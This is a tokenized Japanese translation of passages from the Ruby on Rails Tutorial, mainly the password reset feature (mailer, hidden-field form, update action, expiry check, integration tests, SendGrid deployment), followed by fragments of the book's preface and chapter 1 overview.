▁ アカウント有効化 メイラー メソッド のテスト ▁( リスト \ ref { code : re al _ account _ activation _ test }) ▁ の場合 と同様 、 パスワード再設定 用 メイラー メソッドの テストを書く ことにします ▁( リスト \ ref { code : password _ reset _ mailer _ test })。
▁ただし 、 有効化トークン の場合 と異なり 、 パスワード再設定 用 トークン は ビュー の中で 使用される 点 に ご注意ください 。 有効化トークン は \ ko de { before _ create } コールバック で ユーザー ひ と り ひ と り に対して 作成されます ▁( リスト \ ref { code : user _ model _ activation _ code }) ▁ が 、 パスワード再設定 用 用 トークン の 方は ユーザーが 「 forgot ▁ password 」 フォーム を 送信 できた 場合に だけ 作成されます 。
▁この 動作 は 統合テスト で 自 然 に 行われます ▁( リスト \ ref { code : password _ reset _ integration _ test }) ▁ が 、 この テストでは パスワード再設定 用 トークン を 手動で 作成する必要があります 。
▁ パスワード再設定 用 メイラー メソッド のテスト を追加する
▁リスト \ ref { code : mail _ password _ reset } 、 リスト \ ref { code : password _ reset _ text } 、 リスト \ ref { code : password _ reset _ html } のコード を使用すると 、 正しい メールアドレス を送信し たとき の 画面 は 図 \ ref { fig : valid _ email _ password _ reset } のようになります 。
▁この メール は サーバー ログ では リスト \ ref { code : password _ reset _ email } のように 表示 されます 。
▁ 有効な メールアドレス を送信し た場合
▁ サーバー ログ に 表示 された パスワード再設定 メールの 例
▁S ent ▁ mail ▁to ▁ michael @ michael hartl . com ▁( 6 6 . 8 m s )< n > Date : ▁ T h u , ▁ 04 ▁S e p ▁20 14 ▁0 1 : 04 : 59 ▁+0000 < n > F r o m : ▁ no re p ly @ example . com < n > To : ▁ michael @ michael hartl . com < n > M ess age - ID : ▁< 5 4 07 b a b b e e 1 3 9 _ 8 7 22 b 2 5 7 d 04 5 7 6 a @ mhartl - rails - tutorial - 9 5 3 7 5 3 . mail >< n > S ub j e ct : ▁P as s word ▁ reset < n > M im e - V er s ion : ▁1. 0 < n > Content - Type : ▁ m ulti part / al ter n at ive ; < n > ▁ b ound ary =" - - = = _ m im e part _ 5 4 07 b a b b e 3 50 5 _ 8 7 22 b 2 5 7 d 04 5 6 17 " ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n >< n > ---- = = _ m im e part _ 5 4 07 b a b b e 3 50 5 _ 8 7 22 b 2 5 7 d 04 5 6 17 < n > Content - Type : ▁ text / plain ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n > To ▁ reset ▁your ▁ password ▁c li c k ▁the ▁ link ▁be lo w : < n >< n > http :// rails - tutorial - c 9 - mhartl . c 9 . io / password _ reset s / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / < n > edit ?
▁ email = michael % 4 0 michael hartl . com < n >< n > T h is ▁ link ▁ will ▁ expir e ▁in ▁ two ▁ hour s .
▁< n > ---- = = _ m im e part _ 5 4 07 b a b b e 3 50 5 _ 8 7 22 b 2 5 7 d 04 5 6 17 < n > Content - Type : ▁ text / html ; < n > ▁ cha r set = UT F - 8 < n > Content - Transfer - E n co d ing : ▁ 7 b it < n >< n >< h 1> P as s word ▁ reset </ h 1 >< n >< n >< p > To ▁ reset ▁your ▁ password ▁c li c k ▁the ▁ link ▁be lo w : </ p >< n >< n >< a ▁ href =" http :// rails - tutorial - c 9 - mhartl . c 9 . io / < n > password _ reset s / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / < n > edit ?
▁ email = michael % 4 0 michael hartl . com "> Re set ▁ password </ a >< n >< n >< p > T h is ▁ link ▁ will ▁ expir e ▁in ▁ two ▁ hour s . </ p >< n >< n >< p >< n > I f ▁you ▁d id ▁ not ▁ request ▁your ▁ password ▁to ▁be ▁ reset , ▁ p le as e ▁ ig no re ▁this ▁ email ▁and < n > y our ▁ password ▁ will ▁ st a y ▁as ▁it ▁is .
▁< n ></ p >< n > ---- = = _ m im e part _ 5 4 07 b a b b e 3 50 5 _ 8 7 22 b 2 5 7 d 04 5 6 17 - -
▁ 以下のような フォーム リンク が 動作する ためには 、
▁ http :// example . com / password _ reset s / 3 B d B r X e Q Z S W q F ID R N 8 c x H A / edit ? email = foo % 4 0 bar . com
▁ パスワード再設定 の フォーム が必要です 。
▁この 作業 は ユーザーの edit ビューで ユーザー を更新する ▁( リスト \ ref { code : user _ edit _ view }) ▁ の と似ています が 、 今回は パスワード 入力 フィールド と 確認 用 フィールド だけ を使います 。
▁ 今回は 少し だけ 面倒 な 点 があります 。 メールアドレスを キー として ユーザー を検索する ということ は 、\ ko de { edit } アクション と \ ko de { update } アクション の 両方 で メールアドレス が 必要 になる ということです 。
▁ 例 の メールアドレス 入 り リンク の おかげで 、\ ko de { edit } アクション で メールアドレスを 取り出す のは 問題 ありません 。 しかし フォーム を 送信 すると この 値 は 消 え てしまいます 。 この 値 は ど こ に 保 持 しておく の が よい の でしょう か 。
▁この メールアドレス の 最 適 な 保存 方法は 、\ emph { 隠 し フィールド } として ページ 内に 保存 することです 。 これにより 、 フォーム を 送信 すると 他の 情報 と 一 緒 に メールアドレス が 送信 されます 。
▁作成した コードをリスト \ ref { code : password _ reset _ form } に示します
▁ パスワード再設定 の フォーム
▁リスト \ ref { code : password _ reset _ form } では 以下の フォーム タグ ヘルパー を 使用している 点 に ご注意ください 。
▁これは 、 再 設定 用の リンクをクリックすると 、 前 者 では メールアドレス が \ ko de { params [: email ]} に 保存されます が 、 後 者 を使用すると \ ko de { params [: user ] [: email ]} に保存 され てしまう からです 。
▁今度は 、 この フォーム を 出力 ▁( レンダリング ) ▁ するために P as s word Re set s コントローラの \ ko de { edit } アクション 内で \ ko de {@ user } インスタンス変数 を定義する 必要があります 。
▁ アカウント有効化 ▁( リスト \ ref { code : account _ activation _ edit _ action }) ▁ の場合 と同様 、\ ko de { params [: email ]} にある メールアドレス に対応する ユーザーを この 変数 に保存 します 。
▁\ ko de { edit } アクション と \ ko de { update } アクション の どちら の場合 も 正 当 な \ ko de {@ user } が存在する 必要がある ので 、 いくつかの before フィルタ を使用して @ user の 検索 と バリデーション を行います ▁( リスト \ ref { code : password _ reset _ edit _ action })。
▁ パスワード再設定 の \ ko de { edit } アクション
▁ 有効な ユーザー
▁リスト \ ref { code : password _ reset _ edit _ action } では 以下のコード を使用しています 。
▁このコードは リスト \ ref { code : g en er al ize d _ current _ user } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : account _ activation _ edit _ action } で使用されていま した 。
▁ いずれ の場合 も 、 表 \ ref { table : password _ token _ digest } の 認 証 メソッドを 完了 します 。
▁上のコード を使用することで 、 リスト \ ref { code : password _ reset _ email } の ログ にある リンクを 開 いた ときに パスワード再設定 の フォーム が 出力 される ようになります 。
▁ 実行 結果を 図 \ ref { fig : password _ reset _ form } に示します 。
▁ パスワード再設定 の フォーム
▁リスト \ ref { code : password _ reset _ edit _ action } の ▁\ ko de { edit } アクション に対応する ▁\ ko de { update } アクション を定義する には 、 4 通 り の場合 分 け に対応する 必要があります : ▁ パスワード再設定 の 期 限 が 切 れ ている 場合 、 更新 に成功した場合 、 更新 が 失敗した場合 ▁( パスワード が正しく ない など ) 、 更新 が 失敗した場合 ▁( 一 見 更新 が 成功 した ように 見え る が パスワード が 2 つ とも 空 欄 ) ▁ です 。
▁1 番 目 は \ ko de { edit } アクション と ▁\ ko de { update } アクション の 両方 で 対応する 必要がある ため 、 論 理 的に は before フィルタ で 行う べ き です ▁( リスト \ ref { code : password _ reset _ update _ action })。
▁2 番 目 と 3 番 目 は メ イン の \ ko de { if } 文 の 2 つの 分 岐 に 対応 します ▁( リスト \ ref { code : password _ reset _ update _ action })。
▁ edit フォーム は Active ▁Record モデル オブジェクト ▁( ユーザー など ) ▁ を変更する ので 、 エラーメッセージ の 出力 に リスト \ ref { code : password _ reset _ form } の一部 を 共有 できます 。
▁ この場合 、 パスワード フィールド が 空 である 場合 だけ を 扱 います 。 パスワード の 確認 フィールド が 空 の場合は 、 確認 フィールド のバリデーション で 検出 され 、 エラーメッセージ が表示される ので 不要です 。 ただし 、 パスワード フィールド と パスワード 確認 フィールド が 両方 空 だと バリデーション が スキップ され てしまいます 。
▁ エラー
▁ パスワード再設定 の \ ko de { update } アクション
▁ update
▁# ▁B e for e ▁ action s
▁リスト \ ref { code : password _ reset _ update _ action } の実装 では 以下のコード を使用して 、 パスワード再設定 の 期限切れ の 論理値 テストを User モデルに 委 譲 ▁( de le g at e ) ▁ しています 。
▁この To ▁get ▁this ▁to ▁ w or k , ▁we ▁ n e ed ▁to ▁def in e ▁the ▁\ ko de { password \_ reset \_ expir ed ?}
▁\ ref { sec : password _ reset _ mailer } の メール テンプレート の ところで 説明したように 、 パスワード再設定 の 期 限 を 設定 し 、 2 時間 以上 パスワード が 再 設定 され なかった 場合は 期限切れ に する必要があります 。 これを Ruby で 表現 すると 以下の ようになります 。
▁この 「\ ko de { < }」 記 号 を 「 〜 より 少 ない 」 と 読んで し ま う と 、「 パスワード再設定 メール 送信 時 から 経 過 した 時間 が 、 2 時間 より 少 ない場合 」 と な っ てしまい 、 ここで 行 お う と している こと と 反 対 の 意味 になってしまい ます 。
▁ 「\ ko de { < }」 は ここでは 「 〜 より 早 い 時刻 」 と 読んで ください 。 これ なら 「 パスワード再設定 メールの 送信 時刻 が 、 現在 時刻 より 2 時間 以上 前 の場合 」 と なり 、
▁\ emph { 期待どおり } の 条件 となります 。 そして 条件 が 満 た される と リスト \ ref { code : user _ model _ password _ reset _ expir ed } の \ ko de { password \_ reset \_ expir ed ?} メソッドが 実行されます
▁( この 比 較 の 公式 な 証 明 を \ ref { sec : expir ation _ pro of } に 付 録 として 追加 しました )。
▁# ▁ パスワード再設定 の 期 限 が 切 れ ている 場合は true を返す
▁リスト \ ref { code : user _ model _ password _ reset _ expir ed } のコード を使用すると 、 リスト \ ref { code : password _ reset _ update _ action } の ▁\ ko de { update } ▁ アクション が 動作する ようになります 。
▁ 送信 が 無効 だ った 場合 と 有効 だ った 場合 の 画面 を それぞれ 図 \ ref { fig : password _ reset _ failure } と 図 \ ref { fig : password _ reset _ success } に示します
▁( 確認 のために 2 時間 も 待 って い られ ないので 、 テスト には もうひとつ 分 岐 を追加します が 、 これは \ ref { sec : activation _ reset s _ exercises } の 演習 に 回 す ことにします )。
▁ パスワード の 再 設定 が 失敗した場合
▁ パスワード の 再 設定 が 成功 した 場合
▁この節では 、 リスト \ ref { code : password _ reset _ update _ action } の 2 つ ▁( または 3 つ ) ▁ の 分 岐 、 つまり 送信 に成功した場合 と 失敗した場合 の 統合テスト を作成します
▁( 前 述 の とおり 、 3 番目の 場合 については 演習 に 回 します )。
▁まずは パスワード再設定 のテスト ファイルを 生成 しましょう 。
▁create
▁ パスワード再設定 をテストする 手順 は 、 アカウント有効化 のテスト ▁( リスト \ ref { code : signup _ with _ account _ activation _ test }) ▁ と 多くの 共通 点 があります が 、 テスト の 冒 頭 部分 には 次のような 違 い があります : ▁最初に 「 forgot ▁ password 」 フォーム を表示し て 無効な メールアドレス を送信し 、 次 は その フォーム で 有効な メールアドレスを 送信 します 。 後 者 では パスワード再設定 用 トークン が作成され 、 再 設定 用 メール が 送信 されます 。
▁続いて 、 メールの リンク を開いて 無効な 情報 を送信し 、 次に その リンク から 有効な 情報を 送信 して 、 それぞれ が 期待どおり に 動作する ことを確認します 。
▁作成した テストを リスト \ ref { code : password _ reset _ integration _ test } に示します 。 この テストは コード リ ー デ ィ ング の よい 練 習 台 になります ので 、 み っ ち り お 読み ください 。
▁ パスワード再設定 の 統合テスト
▁ パスワード
▁リスト \ ref { code : password _ reset _ integration _ test } で 使用されている ア イ デ ア の 大 半 は 、 本チュートリアルで 既 出 です 。 今回の 新しい 要素 は \ ko de { input } タグ ぐらい でしょう 。
▁上のコードは 、\ ko de { input } タグ に 正しい 名前 、 type =" h id de n " 、 メールアドレス がある かどうかを確認 します 。
▁リスト \ ref { code : password _ reset _ integration _ test } のコード を使用すると 、 テストコード は ▁\ passing ▁ になるはずです 。
▁ アカウント有効化 と パスワード 復 旧 の 最大 の 山 場 である この セクション では 、 いよいよ production ▁( 本番 ) ▁ 環境で アプリケーション から メールを送信 します 。
▁最初に 無料 の サービス を 利用 して メールを送信 し 、 続いて アプリケーションの 設定 と デプロイ を行います 。
▁ production 環境 から メール 送信 するために 、「 S end G r id 」 という Heroku ア ド オン を使用して アカウント を 検証 します
▁( この ア ド オン を使用する には Heroku アカウント に ク レ ジ ッ ト カ ー ド を設定する 必要があります が 、 アカウント 検証 では 料 金 は 発生 しません )。
▁ ア ド オン を アプリ に追加する には 、 以下のコマンドを実行し ます 。
▁( 訳 注 : ▁ heroku コマンド のバージョン が 古 い と ここで 失敗する かもしれません 。 その 場合は 、 Heroku ▁ To ol b e lt ▁( ▁ https :// to ol b e lt . heroku . com / ▁ ) ▁ を使って 最 新 版 に 更新 するか 、 次の 古 い 文法 の コマンド を 試 してみてください : ▁\ $ ▁ heroku ▁ add on s : add ▁ s end g r id : start er ▁ ) ▁[ B R ] < n > [ B R ] < n > アプリケーションで S end G r id ア ド オン を使用する には 、 production 環境 の \ href { https :// en . w ikipedia . org / wiki / S im p le _ Mail _ Transfer _ Pro to c ol } { S M T P } に 情報を 記 入 する必要があります 。
▁リスト \ ref { code : s end g r id _ config } に示した とおり 、 本番 Web サイトの アドレス を \ ko de { host } 変数 に 定義 する 必要 もあります 。
▁ production 環境 の Rails で S end G r id を使用する 設定
▁config / environments / production . rb
▁=> ▁true
▁リスト \ ref { code : s end g r id _ config } の メール 設定 には S end G r id アカウント の \ ko de { user \_ name } と \ ko de { password } 設定 を 記 入 する 行 もあります が 、 そこ には 記 入 せ ず 、 必ず 環境変数 「\ ko de { ENV }」 に設定する よう 十分 ご注意ください 。
▁ 本番 運 用 する アプリケーション では 、 暗号化 されていない ID や パスワード のような 重要な セキュリティ 情報 は 「 絶 対 に 」 ソースコード に 直接 書き 込 ま ない で ください 。 そのような 情報 は 環境変数 に 記述 し 、 そこ から アプリケーションに 読み込む 必要があります 。
▁ 今回の 場合 、 そう した 変数 は S end G r id ア ド オン が自動的に 設定 してくれます が 、\ ref { sec : image _ upload _ in _ production } では 環境変数 を 自分 で 設定 し なければなりません 。
▁ 参 考 まで に 、 リスト \ ref { code : s end g r id _ config } で使用する Heroku の 環境変数 を表示する には 、 以下のコマンドを実行し ます 。
▁ この時点で 、 Git の トピックブランチ を master に マージ しておきましょう 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁ add ▁- A < n > $ ▁git ▁ commit ▁- m ▁" A d d ▁ password ▁ reset s ▁ & ▁ email ▁config ur ation " < n > $ ▁git ▁ checkout ▁ master < n > $ ▁git ▁ merge ▁ account - activation - password - reset
▁続いて リモート リポジトリ に プッシュ し 、 Heroku に デプロイ します 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁ push < n > $ ▁git ▁ push ▁ heroku < n > $ ▁ heroku ▁run ▁rake ▁ db : migrate
▁ Heroku への デプロイ が完了し たら 、 自分 が 管理 している メールアドレス を使用して 、 production 環境 の サンプルアプリケーション で ユーザー登録 を行って みましょう 。
▁\ ref { sec : account _ activation s _ resource } で 実装 した 有効化 メール が 配信 される はずです ▁( 図 \ ref { fig : activation _ email _ production })。
▁また 、 パスワードを 忘れ た 時の 再 設定 手順 も \ ref { sec : password _ reset } で 実装 した とおり に 動作 するはずです ▁( 図 \ ref { fig : reset _ email _ production })。
▁ production 環境 から 送信 した アカウント有効化 メール
▁ production 環境 から 送信 した パスワード再設定 メール
▁ アカウント有効化 機能 と パスワード再設定 の 機能 が追加され た ことで 、 つ い に サンプルアプリケーションの 登録 、 ログイン 、 ログアウト 機能 が すべて 本 格 的に 実装 完了 しました 。
▁\ emph { Rails チュートリアル } の この後 の 章では 、 Twitter のような マイクロポスト 機能 ▁( 第 \ ref { cha : user _ microposts } 章 ) ▁ と 、 フォロー 中 の ユーザーの 投 稿 の ステータスフィード 機能 ▁( 第 \ ref { cha : following _ users } 章 ) ▁ の 基本的な 部分を サイトに 搭 載 する ことにしましょう 。
▁ それらの 章では 、 Rails の 強力な 機能 ▁( 画像 アップロード 、 カスタム の データベース クエリ 、\ ko de { has \_ many } や \ ko de { has \_ many ▁: through } を使用した 高度な データベース モデリング など ) ▁ を 多 数 紹 介 する 予定です 。
▁< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : activation _ reset s _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁ アカウント有効化 は ▁Active ▁Record オブジェクト では ない が 、 セッション の場合 と同様に 、 リソース で モデル 化 できる 。
▁ メール 送信 のための Active ▁Mailer アクション や ビュー の 生成 機能 が Rails に 備 わ っている 。
▁Action ▁Mailer では テキスト メール と HTML メール を 両方 利用できる 。
▁ メイラー アクション で定義した インスタンス変数 は 、 他の アクション や ビュー と同様 、 メイラー の ビュー から 参 照 できる 。
▁ パスワード の 再 設定 は ▁Active ▁Record オブジェクト では ない が 、 セッション や アカウント有効化 の場合 と同様に 、 リソース で モデル 化 できる 。
▁ アカウント有効化 や パスワード再設定 では 、 ユーザーを 有効化 したり パスワードを 再 設定 するために 一意 の URL を作成する 。 一意 の URL には 生成 した トークン が 使用される 。
▁ メイラー のテスト と 統合テスト は 、 どちら も User メイラー の 振 舞 い を確認する の に 有 用 。
▁S end G r id を使用すると production 環境 から メールを送信 できる 。
▁リスト \ ref { code : password _ reset _ update _ action } の テンプレート を 埋 め て 、 期限切れ の パスワード再設定 の ブランチ ▁( リスト \ ref { code : password _ reset _ expir e _ test }) ▁ の 統合テスト を作成 してください
▁( 10 . 5 7 ▁ のコード にある \ ko de { response . body } は 、 その ページの HTML 本 文 をすべて 返す メソッド です )。
▁ 期限切れ のテスト 方法は さ ま ざ ま ですが 、 リスト \ ref { code : password _ reset _ expir e _ test } で お す す め した 手法 ▁( 大文字 小文字 は 区別 されません ) ▁ を 使 えば 、 レスポンス の 本 文 に 「 expir ed 」 という 語 がある かどうかを チェック できます 。
▁ 現在 は 、 / users のユーザー インデックス ページ を開く と \ emph { すべての } ユーザー が表示され 、 / users / : id のように ID を指定すると 個 別の ユーザーを 表示 できます 。 しかし 考え て み れば 、 有効 でない ユーザー は 表示する 意味 が ありません 。
▁ これはリスト \ ref { code : show _ only _ active _ users _ exercise } で使用されていま した 。
▁ & & と and の動作 は 「 ほぼ 」 同 等 ですが 、 & & 演算子 の 方が and よりも \ href { http :// en . w ikipedia . org / wiki / Order _ of _ o per ation s # Pro gra m m ing _ lang u age s }{\ emph { 優 先 順 位 } } が 高 い ので 、 & & だと \ ko de { root _ url } と の 論 理 的な 結 び 付き が 強 く なり す ぎ てしまい 、 不 適 切 です 。
▁\ ko de { root _ url } を かっこ で 囲 んで この問題 を 回 避 することもできます が 、\ ko de { and } を使用する 方が 常 道 です 。
▁\ emph { 応 用 問題 } : ▁ / users と / users / : id 両方 の 統合テスト を作成 してください 。
▁リスト \ ref { code : update _ column s } の テンプレート に 記 入 することで 、 個 別の \ ko de { update _ attribute } 呼び出し を 単 一 の \ ko de { update _ column s } 呼び出し に 統合 し 、 データベース アクセス が 1 回 で 済 む ように してください 。
▁ 変更 後に テスト を実行し 、 ▁\ passing ▁ になる ことを確認 してください 。
▁ パスワード再設定 の 期限切れ のテスト
▁ 有効な ユーザー だけ を表示する コードの テンプレート
▁ index
▁\ ko de { update _ column s } を使用する テンプレート
▁この 説 では 、\ ref { sec : reset t ing _ the _ password } で 用 いた パスワード 期限切れ の 期 間 の 比 較 が 正しい ことを 証 明 します 。
▁最初に 、 期 間 を 2 つ 定義 します 。
▁ パスワード の 再 設定 は 、 メール が 送信された 時刻 から 経 過 した 期 間 が 、 有効 期 間 よりも 長 く な った 場合に 「 期限切れ 」 となります 。 これを 次のように 表 します 。
▁\ begin { equ ation }< n >\ label { e q : time _ de lt a }< n >\ D e lt a ▁t _ r ▁ > ▁\ D e lt a ▁t _ e .
▁< n >\ end { equ ation }
▁\ begin { equ ation }< n >\ label { e q : de lt a _ p }< n >\ D e lt a ▁t _ r ▁= ▁t _ N ▁- ▁t _ r < n >\ end { equ ation }
▁\ begin { equ ation }< n >\ label { e q : de lt a _ e }< n >\ D e lt a ▁t _ e ▁= ▁t _ N ▁- ▁t _ e .
▁\ begin { equ ation }< n >\ label { e q : time _ com p ar is on }< n > t _ r ▁< ▁t _ e .
▁\ ref { sec : reset t ing _ the _ password } でも 説明 した とおり 、 「\ ko de { < }」 を 「 〜 より 少 ない 」 ではなく 「 〜 より 早 い 時刻 」 と 解 釈 すれば 、「 パスワード の 再 設定 は 、 現在 より 2 時間 以上 前 の 時刻 に 行われた 」 という 言 明 と 一 致 します 。
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } は 、 私 の 以前の 著 書 「\ emph { Rails S p a ce }」 と 、 その 時の 共 著者 の ▁\ href { http :// a ur e . com /}{ A ur e li us ▁ Pro cha z k a } ▁ から 多くの ことを 参 考 に させ ても ら っています 。
▁A ur e ▁ には 、 Rails S p a ce ▁ で の 協 力 と 本書 への 支 援 も 含 め 、 感 謝 したい と思います 。
▁また 、\ emph { Rails S p a ce } ▁ と ▁\ emph { Rails ▁ チュートリアル } の 両方 の 編集 を 担 当 して 頂 いた ▁D e br a ▁ W il li am s ▁C a ul e y ▁ 氏 にも 謝 意 を表し た く 思い ます 。 彼 女 が 野 球 の 試 合 に 連 れ て 行 っ てくれる 限 り 、 私 は 本 を 書き 続 け る でしょう 。
▁最後に 、 ここに 書き き れ ない ほど 多くの 読者 から バグ 報 告 や 提 案 を 頂 き ました 。 彼 ら / 彼 女 ら の おかげで 、 本書 を 可能な 限 り 良い 本 に 仕 上 げ ること が 出 来 ました 。
▁ 『 \ href { http :// www . railstutorial . org / book }{\ emph { Ruby ▁on ▁Rails チュートリアル : ▁Rails で Web 開発 を学ぶ } } 』 へ よう こ そ 。
▁ 本チュートリアル は 、 カスタム Web アプリケーションの 開発 方法 を 教 え るために 書かれ ました 。 そのため の ツール として 、 か の 有 名 な \ href { http :// rubyonrails . org } { Ruby ▁on ▁Rails } という Web フレームワーク を 採 用 しています 。
▁Ruby ▁on ▁Rails ▁3.2 ▁ チュートリアル
▁さらに 、 本チュートリアル は Web 開発 の ベ テ ラ ン にとって も 有 用 です 。 MVC や REST 、 ジェネレータ 、 マイグレーション 、 ルーティング 、 ERB など 、 Rails フレームワーク の コア 技術 を 本チュートリアルで まとめ て 学ぶ ことができます 。
▁ いずれ の場合 であっても 、\ emph { Ruby ▁on ▁Rails チュートリアル } を 最 後 まで 終 え る ことができ れば 、 Rails 周 辺 の さらに 高度な 内容 の 書 籍 、 ブログ 、 スクリーンキャスト など を 読み 解 く 力 を 身 に 付け られます
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 一 貫 した Web 開発 技 法 を学ぶ ために ▁3 ▁ つの サンプルアプリケーション を 作り ます 。 \ emph { hello } アプリ ▁(\ ref { sec : the _ hello _ application }) 、 もう少し だけ 複雑な \ emph { toy } アプリ ▁( 第 \ ref { cha : a _ toy _ app } 章 ) 、 実 践 的な \ emph { sample } アプリ ▁( 第 \ ref { cha : static _ pages } 章 から 第 \ ref { cha : following _ users } 章 まで ) ▁ です 。
▁ アプリ 名を あえて 具 体 的に していない こと から わかるように 、\ emph { Ruby ▁on ▁Rails チュートリアル } で 開発 する アプリケーション では 、 特定の Web サービス に 偏 らない 一般的な 記述 を 心 が け ており 、 読者 の 目的 に か か わ らず 本チュートリアルで Web 開発 の基礎 を学ぶ ことができます 。 とは 言 う もの の 、 最終的な サンプルアプリケーション は ▁( 初期 は Rails で 実装 され ていた ) ▁\ href { http :// t w it ter . com /}{ 某 ソ ー シ ャ ル マ イ ク ロ ブログ サイト } と 「 偶 然 にも 」 と ても よく 似 ています が 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } で Web 開発 を学ぶ う え で どんな 基 礎 知 識 が 必要な のか ▁( = どの ぐらい 素 人 でも 大 丈 夫 な のか ) ▁という 質 問 を よく い ただ きます 。
▁\ ref { sec : pre r equ i site s } でも 詳 しく 解 説 している とおり 、 Web 開発 は まったく の 初心者 が ち ょ っ と 頑 張 った だけで 簡単に 学 べ る ような もの ではありません 。
▁ 当 初 、 本チュートリアル は ある程度 の プログラミング 経験 と Web 開発 経験 がある 読者 を 対象 に していました が 、 現在 は 開発 初心者 を含め た より 多くの 読者 を 対象 と する ように 書き 直 しました 。
▁ 初心者 が 学 び や す く するために
▁\ emph { Ruby ▁on ▁Rails チュートリアル } 第 3 版 では 、 Rails を 学 び や す く するために さまざまな 工 夫 を こ ら しました 。
▁ インストール や 設定 など に関する 多くの わ ず ら わ しい 問題 を 回 避 する ため 、 クラウド 開発 を 標準 で 採 用 しました ▁(\ ref { sec : up _ and _ r un n ing })。
▁ 旧 版 チュートリアル で 依 存 して いた 多くの 外部 ライブラリ ▁( RSpec 、 Cucumber 、 Capybara 、 Factory ▁Girl ) ▁ を 廃 止 しました 。
▁ テスティング を なるべく 簡 便 かつ 柔 軟 性 の 高 い 方法 に 代 え ました 。
▁ Spork 、 Ruby Test の 面倒 な 設定 は 、 なるべく 後 回 し に するか 廃 止 しました 。
▁Rails の 特定の バージョン で しか 使 え ない 機能 の 記述 を 減 ら し 、 その 分 、 Web 開発 全 般 で 通 用 する 原 理 原 則 について の 記述 を 増 や しました 。
▁ 大 改 訂 を 行った \ emph { Ruby ▁on ▁Rails チュートリアル } 第 3 版 が 、 以前の 版 よりも さらに 多くの 読者 にとって 役 立 つ ことを 願 っています 。
▁ 第 1 章では 、 最初に 必要な ソフトウェア を インストール し 、 開発環境 ▁(\ ref { sec : up _ and _ r un n ing }) ▁ を 整 え て Ruby ▁on ▁Rails を 動か す 準備 を します 。
▁次に \ ko de { hello \_ app } という Rails アプリ の最初の サンプル 作成 に 取り か か ります 。
▁\ emph { Rails チュートリアル } では 、 ソフトウェア 開発 の 現 場 で 即 座 に 通 用 する ベ スト プ ラ ク テ ィ ス を学ぶ ために 、 新しい Rails プロジェクト を 作成した 直 後に Git ▁(\ ref { sec : version _ control }) ▁ を使った バージョン管理 を行います 。
▁ 第 1 章 の最後 には 、 作成した アプリ を 早 々 に 本番 ▁( production ) ▁ 環境 ▁(\ ref { sec : de p lo y ing }) ▁ に \ emph { デプロイ して 一 般 公開 する } ところ まで 実 践 します 。
▁ 第 \ ref { cha : a _ toy _ app } 章では 、 Rails アプリケーションの 基本的な 仕組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁\ emph { U R I } は U n i form ▁ Re source ▁I d ent if i er の 略 です 。 それ より や や 一 般 性 の 低 い \ emph { URL } は U n i form ▁ Re source ▁ L o cat or の 略 です 。
▁ U R I は 、 要 する に 「 ブラウザ の アドレス バー にある あ れ 」 と 考え れば だ いた い 合 っています 。
▁ 第 3 章 以降 では 、 いよいよ 本 格 的な 大 規 模 \ emph { サンプルアプリケーション } ▁(\ ko de { sample \_ app } ▁ ) を 開発 します 。 自動生成 コードは 使 わ ずに 、 ゼ ロ から コードを 書き 進め ます 。
▁ サンプルアプリケーションの 開発 では 、「 モックアップ 」 「 テスト駆動開発 ▁( T D D )」 「 統合テスト 」 の 3 つの 手法 を 採 り 入 れ ます 。
▁ 第 \ ref { cha : static _ pages } 章では 静的なページ を作成し 、 そこ に 動的な 要素 を 順 次 追加 していきます 。
▁ 次の 第 \ ref { cha : rails _ f la v or ed _ ruby } 章では 少し 回 り 道 を し 、 Rails を 支 え ている Ruby という 言語 について 簡単に 学 び ます 。
▁ 第 \ ref { cha : fi ll ing _ in _ the _ layout } 章 から 第 \ ref { cha : account _ activation _ and _ password _ reset } 章 に かけ て 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システム を 順に 作成 し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁ 最後の 第 \ ref { cha : user _ microposts } 章 と 第 \ ref { cha : following _ users } 章では 、 マ イ ク ロ ブログ 機能 と ソ ー シ ャ ル 機能を 実装 し 、 実際に 動作する Web サイト を 完成 させ ます 。
▁ お 手 軽 すぎる S ca f fold の 甘 い 誘 惑
▁Rails の 作 者 David ▁ H e in e m er ▁ H an s s on 氏 による 有 名 な 動 画 「\ href { http :// www . y out ub e . com / w at ch ? v = G z j 7 23 L k R J Y } { 15 分 で 作る ブログ } ▁( 英語 )」 が 強 い 印 象 を 与え た おかげで 、 Rails は 立 ち 上 げ 当 初 から 一 気 に 盛 り 上 が り ました 。
▁ この後 にも 続 々 同じ ような 動 画 が 作 られ ています が 、 いずれ も Rails の 能 力 の 一 端 を 垣 間 見 る には う って つ け なので 、 ぜ ひ 一度 ご 覧 ください 。
▁ただし 、 動 画 では 「 15 分 で ブログ を 作る 」 ために \ emph { S ca f fold } という お 手 軽 生成 機能 を使っています 。 Rails の 魔 法 のような \ ko de { generate ▁ scaffold } コマンドで \ emph { 自動生成 した コード } がある から こ そ 、 このような 早 業 が 可能な のです 。
▁ 実際 、 筆者 は Ruby ▁on ▁Rails ▁ の チュートリアル を 書き ながら 、 あ まり にも \ href { http :// en . w ikipedia . org / wiki / D ar k _ s id e _ ( S t ar _ W ar s ) } { お 手 軽 に コードを 生成 できる } ▁( 訳 注 : ▁ 原 文 の 「 q u i c k er , ▁ e as i er , ▁more ▁ s ed u ct ive 」 は 、 ス ター ウ ォ ー ズ ・ エ ピ ソ ー ド V の ヨ ー ダ の 台 詞 の 引 用 ) ▁ scaffold の 機能 を使う 誘 惑 に から れる ことが 何 度 も あり ました 。
▁しかし 、 自動生成 された コードは 無 駄 に 量 が 多く 複 雑 で 、 Rails 初心者 には 向 いて いません 。 たとえ 運 よく 動 いた として も 、 正常に 動 い ている 理由 を 解 明 する のは おそらく 無 理 です 。
